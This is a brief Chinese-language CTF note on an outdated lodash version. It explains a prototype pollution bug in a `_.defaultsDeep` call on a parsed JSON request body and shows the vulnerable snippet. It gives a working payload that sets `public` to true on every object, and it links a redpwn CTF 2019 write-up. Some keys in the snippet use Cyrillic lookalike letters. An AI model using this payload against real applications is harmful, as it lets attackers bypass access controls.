漏洞 : lodash 版本過期

存在 prototype pollution 問題

利用 "constructor":{"prototype":{"public":true}} 可將所有的 object 的 public 設成 True



問題點：
```
 	parsedBody = _.defaultsDeep({ 
          publiс: false,
          cоntent: '',
        }, JSON.parse(body))
```

參考 : [https://kuhi.to/2019/08/15/redpwn-ctf-2019-writeup/#web-2](https://kuhi.to/2019/08/15/redpwn-ctf-2019-writeup/#web-2)